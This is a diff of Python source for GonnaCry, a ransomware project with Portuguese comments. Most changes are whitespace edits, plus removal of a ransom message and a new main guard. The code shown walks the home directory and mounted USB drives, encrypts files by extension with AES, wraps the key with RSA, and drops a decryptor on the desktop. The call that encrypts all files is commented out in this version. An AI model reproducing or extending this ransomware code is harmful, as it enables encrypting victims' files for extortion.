@@ -16,23 +16,18 @@ from RSA import *
 from SRSA import *
 
 
-texto='''
-
-    Bom dia, você foi vitma do Ransomware.
-
-'''
 
 # ponto de partida da criptografia
 def menu(senha_AES,modo):
     # caminho de partida
-    home=os.environ['HOME']
+    home = os.environ['HOME']
     # lista com os tipos
-    f=open('tipos_arquivos.txt','r')
-    tipos=f.read()
-    tipos=tipos.split('\n')
+    f = open('tipos_arquivos.txt','r')
+    tipos = f.read()
+    tipos = tipos.split('\n')
 
-    f=open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
-    a=f.read()
+    f = open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
+    a = f.read()
 
     listar(senha_AES,home,tipos,modo)
     listar_media(senha_AES,modo,tipos)
@@ -40,25 +35,25 @@ def menu(senha_AES,modo):
 
 def listar_media(senha_AES,modo,tipos_arq):
     print('Procurando por pendrives/HDs')
-    caminho='/media/'+getpass.getuser()
+    caminho = '/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
         listar(senha_AES,caminho,tipos_arq,modo)
 
 
 
 def listar(chave_AES,diretorio, tipos_arq, modo):
-    atual=os.getcwd()
-    if(modo==1): # criptografa
+    atual = os.getcwd()
+    if(modo == 1): # criptografa
         for caminho, diretorio, arquivo in os.walk(diretorio):
             for arq in arquivo:
-                a=caminho+'/'+arq
-                extensao=os.path.splitext(a)
+                a = caminho+'/'+arq
+                extensao = os.path.splitext(a)
                 for ext in tipos_arq:
-                    if(extensao[1]==ext):
-                        if(caminho==atual):
-                            ignorar=1
+                    if(extensao[1] == ext):
+                        if(caminho == atual):
+                            ignorar = 1
                         else:
-                            a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                            a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                             try:
                                 criptografa(chave_AES,a)
                             except:
@@ -67,10 +62,10 @@ def listar(chave_AES,diretorio, tipos_arq, modo):
     else: # descriptgrafa
         for caminho, diretorio, arquivo in os.walk(diretorio):
             for arq in arquivo:
-                a=caminho+'/'+arq
-                extensao=os.path.splitext(a)
-                if(extensao[1]=='.cripto'):
-                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
+                a = caminho+'/'+arq
+                extensao = os.path.splitext(a)
+                if(extensao[1] == '.cripto'):
+                    a = a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                     descriptografa(chave_AES,a)
 
 
@@ -99,10 +94,10 @@ def gera_chave_AES():
         senha += choice(caracters)
 
     try:
-        f=open('keys/AES.txt','w')
+        f = open('keys/AES.txt','w')
     except IOError:
         os.mkdir('keys')
-        f=open('keys/AES.txt','w')
+        f = open('keys/AES.txt','w')
     f.write(senha)
     f.close()
     return senha
@@ -111,7 +106,7 @@ def gera_chave_AES():
 
 def crypto_all():
 
-    AES_key=gera_chave_AES()
+    AES_key = gera_chave_AES()
     print('[*] Chave AES gerada')
     #menu(AES_key,1) # -> criptografa tudo
     AES_to_RSA()
@@ -120,16 +115,16 @@ def crypto_all():
     print('[*] Chave privada do cliente criptografada')
 
     # salva o caminho do GonnaCry
-    a=os.getcwd()
-    desktop='/Área\ de\ Trabalho/'
-    rumo=os.environ['HOME']
+    a = os.getcwd()
+    desktop = '/Área\ de\ Trabalho/'
+    rumo = os.environ['HOME']
     if(os.path.isdir(rumo+desktop)):
-        f=open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
+        f = open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
         f.write(a)
         shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
     else:
-        desktop='/Desktop/'
-        f=open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
+        desktop = '/Desktop/'
+        f = open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
         f.write(a)
         shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
     print('[*] Caminho salvo')
@@ -141,15 +136,17 @@ def decrypt_all():
     RSA_to_AES()
     print('[*] chave AES descriptografada')
 
-    f=open('keys/AES.txt','r')
-    a=f.read()
-    tam=len(a)
-    if(tam==30):
-        adsas=1
+    f = open('keys/AES.txt','r')
+    a = f.read()
+    tam = len(a)
+    if(tam == 30):
+        adsas = 1
         #menu(a,2)
 
-crypto_all()
-#decrypt_all()
+# MAIN
+if __name__ == "__main__":
+    crypto_all()
+    #decrypt_all()
 
 # == ALGORITMO ==
     # criptografa todos os arquivos com AES
